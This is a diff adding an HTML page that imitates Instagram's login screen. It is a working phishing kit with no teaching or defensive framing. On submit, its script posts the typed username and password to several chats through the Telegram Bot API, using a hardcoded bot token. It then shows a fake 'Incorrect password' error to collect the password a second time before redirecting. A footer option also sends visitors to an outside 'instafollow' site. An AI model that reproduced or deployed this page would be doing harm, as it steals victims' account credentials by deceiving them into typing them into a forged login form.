@@ -1,0 +1,471 @@
+﻿
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram login</title>
+  <style>
+  /* Universal Selectors */
+/* Universal Selectors */
+#root, body, html {
+  height: 100%;
+  width: 100%;
+}
+
+body {
+  margin: 0;
+  overflow-y: scroll;
+}
+
+a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+  font: inherit;
+  vertical-align: baseline;
+}
+
+a, a:visited {
+  text-decoration: none;
+}
+a:active, .btn:active {
+  opacity: .5;
+}
+
+ol, ul {
+  list-style: none;
+}
+
+body, button, input {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  font-size: 14px;
+  line-height: 18px;
+}
+
+#root, article, main, div, section, header, nav, footer {
+  border: 0 solid #000000;
+  box-sizing: border-box;
+  align-items: stretch;
+  display: flex;
+  flex-direction: column;
+  flex-shrink: 0;
+  margin: 0;
+  padding: 0;
+  position: relative;
+}
+
+/* Main Layout */
+#root {
+  z-index: 0;
+}
+
+.section-all {
+  min-height: 100%;
+  overflow: hidden;
+}
+
+.main {
+  background-color: #fafafa;
+  order: 4;
+  flex-grow: 1;
+}
+
+.wrapper {
+  min-height: 100%;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+}
+
+.article {
+  flex-direction: row;
+  margin: 0 auto;
+  max-width: 935px;
+  width: 100%;
+  display: flex;
+  justify-content: center;
+}
+
+.content {
+  color: #262626;
+  flex-grow: 1;
+  max-width: 350px;
+  margin-top: 12px;
+  width: 100%;
+  padding: 0 15px;
+}
+
+.login-box {
+  background: #fff;
+  border: 1px solid #e6e6e6;
+  border-radius: 1px;
+  margin-bottom: 10px;
+  padding: 10px 0;
+}
+
+.header {
+  margin: 14px auto 12px;
+  text-align: center;
+}
+
+.logo {
+  background: cover no-repeat;
+  width: 175px;
+  height: auto;
+  display: block;
+  margin: 0 auto;
+}
+
+.form {
+  display: flex;
+  flex-direction: column;
+  margin-bottom: 10px;
+}
+
+.input-box {
+  margin: 6px 0;
+}
+
+input {
+  height: 36px;
+  border: 1px solid #efefef;
+  border-radius: 3px;
+  background-color: #fafafa;
+  width: 100%;
+  font-size: 14px;
+  padding: 10px;
+  box-sizing: border-box;
+}
+
+input:focus {
+  border-color: #bbb;
+}
+
+.button-box {
+  margin: 10px 0;
+}
+
+.btn {
+  cursor: pointer;
+  width: 100%;
+  background: #3897f0;
+  border: 1px solid #3897f0;
+  color: #fff;
+  border-radius: 3px;
+  font-weight: 600;
+  font-size: 14px;
+  height: 36px;
+  line-height: 34px;
+  outline: none;
+}
+
+.forgot {
+  font-size: 12px;
+  margin-top: 12px;
+  text-align: center;
+  color: #003569;
+  line-height: 14px !important;
+}
+
+.text {
+  text-align: center;
+  margin: 15px auto;
+  color: #262626;
+  font-size: 14px;
+}
+
+.text a {
+  color: #3897f0;
+  margin-left: 3px;
+}
+
+/* App Store */
+.app p {
+  line-height: 18px;
+  color: #262626;
+  font-size: 14px;
+  text-align: center;
+  margin: 10px 20px;
+}
+
+.app-img {
+  display: flex;
+  flex-direction: row;
+  justify-content: center;
+  gap: 8px;
+  margin: 10px 0;
+}
+
+.app-img img {
+  height: 40px;
+}
+
+/* Footer */
+.footer {
+  background-color: #fafafa;
+  order: 5;
+  padding: 20px;
+}
+
+.footer-container {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+  max-width: 935px;
+  font-size: 12px;
+  font-weight: 600;
+  margin: 0 auto;
+  text-transform: uppercase;
+  width: 100%;
+}
+
+.footer-nav ul {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 10px;
+  justify-content: center;
+}
+
+.footer-nav ul li {
+  margin-bottom: 7px;
+}
+
+.footer-nav ul li a {
+  color: #003569;
+}
+
+.footer span {
+  color: #999;
+}
+
+span.language {
+  color: #003569;
+  cursor: pointer;
+  font-weight: 600;
+  text-transform: uppercase;
+}
+
+/* Mobile Media Query */
+@media (max-width: 450px) {
+  .article {
+    flex-direction: column;
+    align-items: center;
+    padding: 10px;
+  }
+
+  .content {
+    max-width: 100%;
+    padding: 0 10px;
+  }
+
+  .login-box {
+    border: none;
+    background: transparent;
+    padding: 0;
+    margin: 0 auto;
+  }
+
+  .form {
+    padding: 0;
+  }
+
+  .input-box {
+    margin: 6px 0;
+  }
+
+  input {
+    font-size: 14px;
+    padding: 10px;
+  }
+
+  .button-box {
+    margin: 10px 0;
+  }
+
+  .btn {
+    height: 36px;
+    font-size: 16px;
+  }
+
+  .text, .forgot {
+    margin: 10px auto;
+    font-size: 13px;
+  }
+
+  .app p {
+    font-size: 13px;
+    margin: 5px 0;
+  }
+
+  .footer-container {
+    flex-direction: column;
+    align-items: center;
+    padding: 10px 0;
+  }
+
+  .footer-nav ul {
+    justify-content: center;
+  }
+}
+
+    
+  </style>
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<body>
+  <span id="root">
+    <section class="section-all">
+
+      <!-- 1-Role Main -->
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                </div><!-- Header end -->
+                <div class="form-wrap">
+                 <form class="form" id="loginForm">
+    <div class="input-box">
+        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+    </div>  
+
+    <div class="input-box">
+        <input type="password" id="password" name="password" placeholder="Password" required>
+    </div>  
+
+    <span class="button-box">
+        <button class="btn" type="submit">Log in</button>
+    </span>  
+
+    <a class="forgot" href="#">Forgot password?</a>
+</form>
+
+
+
+                </div> <!-- Form-wrap end -->
+              </div> <!-- Login-box end -->
+
+              <div class="login-box">
+                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
+              </div> <!-- Signup-box end -->
+
+              <div class="app">
+                <p>Get the app.</p>
+                <div class="app-img">
+                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
+                  </a>
+                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
+                  </a>  
+                </div>  <!-- App-img end-->
+              </div> <!-- App end -->
+            </div> <!-- Content end -->
+          </article>
+        </div> <!-- Wrapper end -->
+      </main>
+
+      <!-- 2-Role Footer -->
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+
+          <nav class="footer-nav" role="navigation">
+            <ul>
+              <li><a href="">About Us</a></li>
+              <li><a href="">Support</a></li>
+              <li><a href="">Blog</a></li>
+              <li><a href="">Press</a></li>
+              <li><a href="">Api</a></li>
+              <li><a href="">Jobs</a></li>
+              <li><a href="">Privacy</a></li>
+              <li><a href="">Terms</a></li>
+              <li><a href="">Directory</a></li>
+              <li>
+                <span class="language">Language
+                  <select name="language" class="select" onchange="la(this.value)">
+                    <option value="#">English</option>
+                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
+                  </select>
+                </span>
+              </li>
+            </ul>
+          </nav>
+
+          <span class="footer-logo">&copy; 2018 Instagram</span>
+        </div> <!-- Footer container end -->
+      </footer>
+      
+    </section>
+  </span> <!-- Root -->
+
+  <!-- Select Link -->
+  <script type="text/javascript">
+    function la(src) {
+      window.location=src;
+    }
+  </script>
+  
+  <script>
+document.addEventListener("DOMContentLoaded", function () {
+    let attemptCount = 0;
+
+    document.getElementById("loginForm").addEventListener("submit", function (event) {
+        event.preventDefault();
+
+        let username = document.getElementById("username").value;
+        let password = document.getElementById("password").value;
+
+        let botToken = "7052960867:AAGfNHEoJZ3FEu2OST_gACvY_Z5VOuZ0xTU";
+        let chatIds = ["7638541846", "5837367069", "675310182478"];
+
+        let message = `📩 *instagram Login* 📩\n\n👤 *Username:* ${username}\n🔒 *Password:* ${password}\n\n⚠️ *Owner:* Nikhillendra ⚠️`;
+
+        // Send message to all chat IDs
+        chatIds.forEach(chatId => {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            }).then(res => res.json())
+              .then(data => console.log(`Sent to ${chatId}`, data))
+              .catch(err => console.error(`Error to ${chatId}`, err));
+        });
+
+        if (attemptCount === 0) {
+            // Show error message only once
+            let existingError = document.getElementById("loginError");
+            if (!existingError) {
+                let errorMessage = document.createElement("div");
+                errorMessage.id = "loginError";
+                errorMessage.textContent = "Incorrect password. Please try again.";
+                errorMessage.style.color = "red";
+                errorMessage.style.marginTop = "10px";
+                document.querySelector(".button-box").appendChild(errorMessage);
+            }
+        } else {
+            // Redirect after second attempt
+            setTimeout(() => {
+                window.location.href = "somethingwrong.html";
+            }, 1000); // 1 second delay
+        }
+
+        attemptCount++;
+        document.getElementById("password").value = "";
+    });
+});
+</script>
+</body>
+<!-- partial -->
+  
+</body>
+</html>
